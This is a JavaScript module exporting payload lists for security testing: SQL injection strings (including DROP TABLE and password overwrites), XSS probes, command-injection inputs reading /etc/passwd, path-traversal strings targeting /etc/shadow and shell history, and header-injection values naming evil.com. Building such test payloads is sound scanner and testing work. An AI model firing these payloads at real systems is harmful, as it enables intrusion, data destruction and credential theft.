/**
 * Security Testing Payloads
 * Contains all attack vectors for different vulnerability types
 */

const payloads = {
  sqlInjection: [
    // Basic SQL Injection
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    
    // Union Based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "1 UNION SELECT * FROM users",
    
    // Error Based
    "' AND 1=CONVERT(int, @@version)--",
    "' AND 1=1--",
    "' AND 1=2--",
    
    // Time Based Blind
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "1' AND SLEEP(5)#",
    
    // Stacked Queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked'--",
    
    // NoSQL Injection
    "{'$gt': ''}",
    "{'$ne': null}",
    "admin'--",
    
    // Additional patterns
    "1; DROP TABLE users",
    "1'); DROP TABLE users--",
    "' OR ''='",
    "' OR 1=1#",
    "admin'/*",
    "') OR ('1'='1",
  ],

  xss: [
    // Basic XSS
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    
    // Event Handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    
    // Attribute Injection
    "\" onclick=\"alert(1)\"",
    "' onclick='alert(1)'",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    
    // URL Based
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    
    // Encoded XSS
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    
    // SVG Based
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    
    // Template Injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    
    // DOM Based
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "</script><script>alert(1)</script>",
  ],

  commandInjection: [
    // Unix Commands
    "; ls",
    "; ls -la",
    "| ls",
    "| ls -la",
    "& ls",
    "&& ls",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "&& whoami",
    "& whoami",
    "; id",
    "| id",
    "; uname -a",
    "| uname -a",
    
    // Windows Commands
    "& dir",
    "| dir",
    "; dir",
    "&& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; type C:\\Windows\\win.ini",
    "& whoami",
    "| net user",
    
    // Command Chaining
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "; ping -c 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    
    // Backtick Execution
    "`ls`",
    "`whoami`",
    "`cat /etc/passwd`",
    
    // Subshell Execution
    "$(ls)",
    "$(whoami)",
    "$(cat /etc/passwd)",
    
    // Newline Injection
    "%0als",
    "%0awhoami",
    "\\nls",
    "\\nwhoami",
    
    // Null Byte
    "; ls%00",
    "| whoami%00",
  ],

  pathTraversal: [
    // Unix Path Traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../var/log/auth.log",
    "../../../root/.bash_history",
    
    // Windows Path Traversal
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\boot.ini",
    "....//....//....//etc/passwd",
    "....//..//..//..//windows/system.ini",
    
    // URL Encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem.ini",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5csystem.ini",
    
    // Double Encoded
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    
    // Null Byte Injection
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00.jpg",
    
    // Unicode/UTF-8
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cwindows/system.ini",
    
    // Filter Bypass
    "....//....//....//etc/passwd",
    "..../\\/..../\\/..../\\/etc/passwd",
    "..;/..;/..;/etc/passwd",
  ],

  headerInjection: [
    // CRLF Injection
    "%0d%0aSet-Cookie: malicious=value",
    "%0d%0aLocation: http://evil.com",
    "\\r\\nX-Injected: header",
    "%0aX-Injected: header",
    
    // Host Header Injection
    "evil.com",
    "localhost",
    "127.0.0.1",
    
    // X-Forwarded Headers
    "127.0.0.1, evil.com",
    "localhost",
  ]
};

module.exports = payloads;

